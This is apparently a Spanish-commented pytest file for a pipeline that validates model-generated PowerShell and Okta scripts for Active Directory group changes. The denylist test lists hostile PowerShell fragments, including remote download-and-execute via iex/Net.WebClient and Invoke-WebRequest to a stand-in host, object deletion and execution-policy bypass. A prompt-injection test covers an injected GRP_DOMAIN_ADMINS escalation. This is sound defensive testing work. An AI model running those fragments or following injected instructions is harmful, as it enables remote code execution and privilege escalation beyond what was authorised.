"""Pruebas adversariales de la cadena de validacion.

Cada prueba de este archivo construye a mano una salida que un modelo
podria producir —por error, por alucinacion o porque alguien manipulo el
dataset para inducirla— y verifica que la cadena la rechace. Es la unica
parte del sistema donde escribir el caso malicioso es mas importante que
escribir el caso bueno: el caso bueno falla ruidosamente, el malicioso
falla en silencio y aplicando cambios.

Los controles se prueban de a uno y tambien en conjunto, porque el orden en
que corren es parte del diseno: la cadena corta en el primer fallo, y una
salida que no parsea no deberia llegar nunca al control de correspondencia.
"""
from __future__ import annotations

import json

import pytest

from app.modulos.validacion import validar_salida

AUTORIZADOS = {"ID-ABC123", "GRP_ERP_CONSULTA", "GRP_ERP_REPORTES"}


def respuesta(script: str, lenguaje: str = "powershell", **extra) -> str:
    return json.dumps(
        {
            "lenguaje": lenguaje,
            "script": script,
            "explicacion": "cambios de pertenencia a grupo",
            **extra,
        }
    )


SCRIPT_VALIDO = (
    "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-ABC123\n"
    "Add-ADGroupMember -Identity GRP_ERP_REPORTES -Members ID-ABC123"
)


# ---------------------------------------------------------------------------
# El caso que tiene que pasar
# ---------------------------------------------------------------------------


def test_una_salida_correcta_supera_los_cinco_controles() -> None:
    resultado = validar_salida(respuesta(SCRIPT_VALIDO), "powershell", AUTORIZADOS)
    assert resultado.aprobado, resultado.motivo
    assert [c.nombre for c in resultado.controles] == [
        "esquema",
        "sintaxis",
        "lista_blanca",
        "lista_negra",
        "correspondencia",
    ]
    assert all(c.aprobado for c in resultado.controles)


def test_el_cercado_de_markdown_no_invalida_la_respuesta() -> None:
    """Concesion acotada: se quita el bloque de codigo, nada mas.

    No se intenta reparar JSON mal formado. Un modelo que no puede devolver
    JSON valido no deberia ser compensado por el validador.
    """
    envuelto = f"```json\n{respuesta(SCRIPT_VALIDO)}\n```"
    assert validar_salida(envuelto, "powershell", AUTORIZADOS).aprobado


# ---------------------------------------------------------------------------
# Control 1: esquema
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "bruto",
    [
        "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-ABC123",
        "{'lenguaje': 'powershell'}",
        '{"lenguaje": "powershell"}',
        '{"lenguaje": "powershell", "script": ""}',
        '["powershell", "script"]',
        "",
    ],
)
def test_una_respuesta_que_no_cumple_el_esquema_se_rechaza(bruto: str) -> None:
    resultado = validar_salida(bruto, "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[0].nombre == "esquema"
    assert len(resultado.controles) == 1, "la cadena tiene que cortar en el primer fallo"


def test_un_campo_de_mas_se_rechaza() -> None:
    """El esquema es cerrado: un campo inesperado es una salida inesperada."""
    bruto = respuesta(SCRIPT_VALIDO, comando_extra="Remove-ADObject")
    assert not validar_salida(bruto, "powershell", AUTORIZADOS).aprobado


def test_el_lenguaje_declarado_tiene_que_ser_el_pedido() -> None:
    bruto = respuesta(SCRIPT_VALIDO, lenguaje="bash")
    resultado = validar_salida(bruto, "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert "bash" in resultado.motivo


# ---------------------------------------------------------------------------
# Control 2: sintaxis
# ---------------------------------------------------------------------------


def test_un_script_con_estructura_rota_se_rechaza() -> None:
    roto = 'Add-ADGroupMember -Identity "GRP_ERP_CONSULTA -Members ID-ABC123'
    resultado = validar_salida(respuesta(roto), "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "sintaxis"


def test_okta_rechaza_un_cuerpo_que_no_es_json() -> None:
    resultado = validar_salida(
        respuesta("no soy json", lenguaje="okta"), "okta", AUTORIZADOS
    )
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "sintaxis"


def test_okta_rechaza_una_llamada_con_metodo_invalido() -> None:
    cuerpo = json.dumps([{"metodo": "PATCH", "ruta": "/api/v1/groups/X/users/Y"}])
    resultado = validar_salida(
        respuesta(cuerpo, lenguaje="okta"), "okta", AUTORIZADOS
    )
    assert not resultado.aprobado
    assert "metodo invalido" in " ".join(resultado.controles[-1].hallazgos)


# ---------------------------------------------------------------------------
# Control 3: lista blanca
# ---------------------------------------------------------------------------


def test_un_cmdlet_fuera_de_la_lista_blanca_invalida_el_script() -> None:
    script = (
        "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-ABC123\n"
        "New-ADUser -Name ID-ABC123"
    )
    resultado = validar_salida(respuesta(script), "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "lista_blanca"
    assert "New-ADUser" in resultado.controles[-1].hallazgos


def test_un_script_sin_operaciones_reconocibles_se_rechaza() -> None:
    """Un script que no hace nada reconocible no es un script valido.

    Si la lista blanca aceptara el vacio, bastaria con que el modelo
    devolviera texto inocuo para saltear el control.
    """
    resultado = validar_salida(
        respuesta("# solo un comentario"), "powershell", AUTORIZADOS
    )
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "lista_blanca"


def test_un_cmdlet_escondido_en_una_cadena_no_cuenta_como_operacion() -> None:
    """Lo que esta dentro de una cadena no se ejecuta, y no debe confundir."""
    script = (
        'Write-Output "esto menciona New-ADUser pero no lo ejecuta"\n'
        "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-ABC123"
    )
    assert validar_salida(respuesta(script), "powershell", AUTORIZADOS).aprobado


def test_okta_rechaza_una_ruta_fuera_de_la_lista_blanca() -> None:
    cuerpo = json.dumps(
        [{"metodo": "GET", "ruta": "/api/v1/logs", "usuario": "ID-ABC123"}]
    )
    resultado = validar_salida(respuesta(cuerpo, lenguaje="okta"), "okta", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "lista_blanca"


# ---------------------------------------------------------------------------
# Control 4: lista negra
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("fragmento", "motivo"),
    [
        ("Invoke-Expression $payload", "invocacion dinamica"),
        ("iex (New-Object Net.WebClient)", "invocacion dinamica"),
        ("Invoke-WebRequest http://ejemplo.test/x.ps1", "descarga"),
        ("Remove-ADObject -Identity GRP_ERP_CONSULTA", "borrado"),
        ("Add-Type -TypeDefinition $codigo", "compilacion"),
        ("[Reflection.Assembly]::Load($b)", "reflexion"),
        ("$d = [Convert]::FromBase64String($x)", "codificado"),
        ("Start-Process cmd", "procesos"),
        ("Set-ExecutionPolicy Bypass", "politica de ejecucion"),
    ],
)
def test_los_patrones_prohibidos_se_rechazan(fragmento: str, motivo: str) -> None:
    script = f"{SCRIPT_VALIDO}\n{fragmento}"
    resultado = validar_salida(respuesta(script), "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    fallado = resultado.controles[-1]
    assert fallado.nombre in ("lista_blanca", "lista_negra")


def test_la_lista_negra_pesa_mas_que_la_blanca() -> None:
    """Un cmdlet permitido no salva a un script con un patron prohibido.

    El caso concreto: Set-ADUser esta en la lista blanca, pero usarlo para
    escribir en el sistema de archivos no deberia pasar.
    """
    script = (
        "Set-ADUser -Identity ID-ABC123 -Description 'x'\n"
        "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-ABC123 "
        "> C:\\temp\\log.txt"
    )
    resultado = validar_salida(respuesta(script), "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "lista_negra"


def test_okta_rechaza_el_acceso_a_endpoints_sensibles() -> None:
    cuerpo = json.dumps(
        [{"metodo": "GET", "ruta": "/api/v1/policies", "usuario": "ID-ABC123"}]
    )
    resultado = validar_salida(respuesta(cuerpo, lenguaje="okta"), "okta", AUTORIZADOS)
    assert not resultado.aprobado


# ---------------------------------------------------------------------------
# Control 5: correspondencia
# ---------------------------------------------------------------------------


def test_un_grupo_inventado_invalida_el_script() -> None:
    """El control que ataca de frente la alucinacion.

    El script es sintacticamente impecable y usa solo operaciones
    permitidas. Lo unico que esta mal es que menciona un grupo que no estaba
    en la decision, y con eso alcanza.
    """
    script = (
        "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-ABC123\n"
        "Add-ADGroupMember -Identity GRP_ERP_ADMIN_USUARIOS -Members ID-ABC123"
    )
    resultado = validar_salida(respuesta(script), "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "correspondencia"
    assert "GRP_ERP_ADMIN_USUARIOS" in resultado.controles[-1].hallazgos


def test_un_usuario_distinto_del_de_la_decision_invalida_el_script() -> None:
    script = "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-OTRO999"
    resultado = validar_salida(respuesta(script), "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "correspondencia"


def test_un_script_sin_identificadores_no_se_da_por_valido() -> None:
    """Sin identificadores no hay nada que contrastar, y eso no es aprobar."""
    script = "Get-ADUser -Filter *"
    resultado = validar_salida(respuesta(script), "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "correspondencia"


def test_okta_contrasta_los_identificadores_del_cuerpo() -> None:
    cuerpo = json.dumps(
        [
            {
                "metodo": "PUT",
                "ruta": "/api/v1/groups/GRP_ERP_CONSULTA/users/ID-ABC123",
                "grupo": "GRP_INVENTADO",
                "usuario": "ID-ABC123",
            }
        ]
    )
    resultado = validar_salida(respuesta(cuerpo, lenguaje="okta"), "okta", AUTORIZADOS)
    assert not resultado.aprobado
    assert resultado.controles[-1].nombre == "correspondencia"


def test_un_subconjunto_de_la_decision_es_valido() -> None:
    """Hacer de menos no es alucinar.

    Un script que aplica solo parte de los cambios es incompleto, no
    peligroso. La cadena lo acepta y la diferencia la ve la persona que
    aprueba, que tiene la decision al lado.
    """
    script = "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-ABC123"
    assert validar_salida(respuesta(script), "powershell", AUTORIZADOS).aprobado


# ---------------------------------------------------------------------------
# Inyeccion a traves de los datos
# ---------------------------------------------------------------------------


def test_una_instruccion_escondida_en_un_nombre_no_amplia_lo_autorizado() -> None:
    """LLM01 visto desde el validador.

    Aunque el modelo se dejara convencer por texto malicioso incrustado en
    un nombre de grupo, el control de correspondencia sigue comparando
    contra el conjunto que armo el motor de reglas. La defensa no depende de
    que el modelo se porte bien.
    """
    script = (
        "Add-ADGroupMember -Identity GRP_ERP_CONSULTA -Members ID-ABC123\n"
        "Add-ADGroupMember -Identity GRP_DOMAIN_ADMINS -Members ID-ABC123"
    )
    resultado = validar_salida(respuesta(script), "powershell", AUTORIZADOS)
    assert not resultado.aprobado
    assert "GRP_DOMAIN_ADMINS" in resultado.controles[-1].hallazgos


def test_la_plataforma_desconocida_se_rechaza() -> None:
    resultado = validar_salida(
        respuesta(SCRIPT_VALIDO, lenguaje="terraform"), "terraform", AUTORIZADOS
    )
    assert not resultado.aprobado


def test_el_resultado_es_serializable_para_la_pantalla() -> None:
    resultado = validar_salida(respuesta(SCRIPT_VALIDO), "powershell", AUTORIZADOS)
    datos = resultado.como_diccionario()
    assert datos["aprobado"] is True
    assert len(datos["controles"]) == 5
    assert json.dumps(datos)
